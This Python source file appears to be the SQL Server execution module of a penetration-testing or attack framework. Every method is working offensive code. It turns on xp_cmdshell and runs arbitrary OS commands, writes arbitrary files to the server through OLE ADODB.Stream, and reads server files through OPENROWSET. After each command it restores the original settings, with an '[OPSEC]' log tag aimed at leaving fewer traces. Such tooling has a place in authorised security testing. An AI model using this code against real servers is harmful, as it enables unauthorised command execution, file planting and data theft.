import binascii

class MSSQLEXEC:
    def __init__(self, connection, logger):
        self.mssql_conn = connection
        self.logger = logger

    def execute(self, command):
        result = None
        try:
            self.logger.debug("Attempting to enable xp cmd shell")
            self.enable_xp_cmdshell()
        except Exception as e:
            self.logger.error(f"Error when attempting to enable x_cmdshell: {e}")
        try:
            cmd = f"exec master..xp_cmdshell '{command}'"
            self.logger.debug(f"Attempting to execute query: {cmd}")
            result = self.mssql_conn.sql_query(cmd)
            self.logger.debug(f"Raw results from query: {result}")
            if result:
                result = "\n".join(line["output"] for line in result if line["output"] != "NULL")
                self.logger.debug(f"Concatenated result together for easier parsing: {result}")
                # if you prepend SilentlyContinue it will still output the error, but it will still continue on (so it's not silent...)
                if "Preparing modules for first use" in result and "Completed" not in result:
                    self.logger.error("Error when executing PowerShell (received 'preparing modules for first use'), try prepending $ProgressPreference = 'SilentlyContinue'; to your command")
        except Exception as e:
            self.logger.error(f"Error when attempting to execute command via xp_cmdshell: {e}")

        try:
            self.logger.debug("Attempting to disable xp cmd shell")
            self.disable_xp_cmdshell()
        except Exception as e:
            self.logger.error(f"[OPSEC] Error when attempting to disable xp_cmdshell: {e}")
        return result

    def enable_xp_cmdshell(self):
        global advop
        global cmdshell
        #Check for "show advanced options"
        query = "exec master.dbo.sp_configure 'show advanced options';"
        self.mssql_conn.sql_query(query)
        result = self.mssql_conn.sql_query(query)
        for data in result:
          if isinstance(data, dict):
             for key, value in data.items():
                  if key == "config_value":
                      self.logger.debug(f"{key}: {value}")
                      if value == 0:
                         self.logger.highlight("'show advanced options' is disabled - Will require to be on for xp_cmdshell to be enabled")
                         query = "exec master.dbo.sp_configure 'show advanced options',1;RECONFIGURE;"
                         self.logger.debug(f"Executing query: {query}")
                         self.mssql_conn.sql_query(query)
                         advop = 0
                      else:
                         self.logger.highlight("'show advanced options' is already enabled")
                         advop = 1
                  else:
                      ""
          else:
              self.logger.fail("Unexpected output")
          
        #Check for "xp_cmdshell"
        query = "exec master.dbo.sp_configure 'xp_cmdshell';"
        self.mssql_conn.sql_query(query)
        result = self.mssql_conn.sql_query(query)
        for data in result:
          if isinstance(data, dict):
             for key, value in data.items():
                  if key == "config_value":
                      self.logger.debug(f"{key}: {value}")
                      if value == 0:
                         self.logger.highlight("'xp_cmdshell' options is disabled - Will be enabled")
                         query = "exec master.dbo.sp_configure 'xp_cmdshell', 1;RECONFIGURE;"
                         self.logger.debug(f"Executing query: {query}")
                         self.mssql_conn.sql_query(query)
                         cmdshell = 0
                      else:
                         self.logger.highlight("'xp_cmdshell' options is already enabled")
                         cmdshell = 1
                  else:
                      ""
          else:
              self.logger.fail("Unexpected output")

    def disable_xp_cmdshell(self):
        self.logger.highlight(f"Reverting 'show advanced options' back to {advop}")
        self.logger.highlight(f"Reverting 'xp_cmdshell' back to {cmdshell}")
        query = f"exec sp_configure 'xp_cmdshell', {cmdshell} ;RECONFIGURE;exec sp_configure 'show advanced options', {advop} ;RECONFIGURE;"
        self.logger.debug(f"Executing query: {query}")
        self.mssql_conn.sql_query(query)

    def enable_ole(self):
        query = "exec master.dbo.sp_configure 'show advanced options',1;RECONFIGURE;exec master.dbo.sp_configure 'Ole Automation Procedures', 1;RECONFIGURE;"
        self.logger.debug(f"Executing query: {query}")
        self.mssql_conn.sql_query(query)

    def disable_ole(self):
        query = "exec master.dbo.sp_configure 'show advanced options',1;RECONFIGURE;exec master.dbo.sp_configure 'Ole Automation Procedures', 0;RECONFIGURE;"
        self.logger.debug(f"Executing query: {query}")
        self.mssql_conn.sql_query(query)

    def put_file(self, data, remote):
        try:
            self.enable_ole()
            hexdata = data.hex()
            self.logger.debug(f"Hex data to write to file: {hexdata}")
            query = f"DECLARE @ob INT;EXEC sp_OACreate 'ADODB.Stream', @ob OUTPUT;EXEC sp_OASetProperty @ob, 'Type', 1;EXEC sp_OAMethod @ob, 'Open';EXEC sp_OAMethod @ob, 'Write', NULL, 0x{hexdata};EXEC sp_OAMethod @ob, 'SaveToFile', NULL, '{remote}', 2;EXEC sp_OAMethod @ob, 'Close';EXEC sp_OADestroy @ob;"
            self.logger.debug(f"Executing query: {query}")
            self.mssql_conn.sql_query(query)
            self.disable_ole()
        except Exception as e:
            self.logger.debug(f"Error uploading via mssqlexec: {e}")

    def file_exists(self, remote):
        try:
            query = f"DECLARE @r INT; EXEC master.dbo.xp_fileexist '{remote}', @r OUTPUT; SELECT @r as n"
            self.logger.debug(f"Executing query: {query}")
            res = self.mssql_conn.batch(query)
            self.logger.debug(f"File check response: {res}")
            return res[0]["n"] == 1
        except Exception:
            return False

    def get_file(self, remote, local):
        try:
            query = f"SELECT * FROM OPENROWSET(BULK N'{remote}', SINGLE_BLOB) rs"
            self.logger.debug(f"Executing query: {query}")
            self.mssql_conn.sql_query(query)
            data = self.mssql_conn.rows
            self.logger.debug(f"Get file returned: {data}")
            with open(local, "wb+") as f:
                f.write(binascii.unhexlify(data[0]["BulkColumn"]))
        except Exception as e:
            self.logger.debug(f"Error downloading via mssqlexec: {e}")
